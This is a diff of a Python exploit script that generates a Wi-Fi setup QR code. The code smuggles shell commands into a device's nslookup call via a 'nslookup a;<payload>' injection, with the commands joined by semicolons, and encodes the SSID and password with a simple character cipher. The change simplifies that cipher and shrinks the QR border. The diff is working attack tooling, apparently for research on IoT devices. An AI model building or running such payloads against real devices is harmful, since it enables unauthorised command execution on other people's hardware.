@@ -10,29 +10,21 @@ __license__ = "MIT"
 
 
 def cipher(data):
-    iArr = [[-128, -48, 33, 164], [-47, 32, 34, 84], [33, 35, -1, 0], [127, 127, 35, -91]]
-    out = ""
-    for c in data:
-        for j in iArr:
-            if j[0] > c or j[1] < c:
-                continue
-            out += (j[2] if j[2] != -1 else c) + j[3] + c
-        out += chr(0xA2 - c)
-    return out
+    return "".join([chr(0xa2 - ord(c)) for c in data])
 
 
 def generate_payload(ssid, pwd, payload, post_init):
     """
     qrcode buffer is [1024]
     nslookup sprintf buffer [132]
-    "nslookup domain;<payload>0x00"
+    "nslookup a;<payload>0x00"
     """
     payload.insert(0, 'a')
     qrcode_data = {
         "b": "\\n".join(post_init),
         "d": ";".join(payload),
-        "x": cipher(ssid.encode()),
-        "y": cipher(pwd.encode()),
+        "x": cipher(ssid),
+        "y": cipher(pwd),
         "l": "en",
     }
     payload_string = "&".join([f"{k}={v}" for k, v in qrcode_data.items()])
@@ -45,9 +37,9 @@ def generate_payload(ssid, pwd, payload, post_init):
 
 def gen_qrcode(data, outfile=None):
     qrcode = segno.make(data, error="h")
-    qrcode.terminal(compact=True, border=10)
+    qrcode.terminal(compact=True, border=5)
     if outfile:
-        qrcode.save(outfile, border=10, scale=8)
+        qrcode.save(outfile, border=5, scale=8)
 
 
 def main(args):
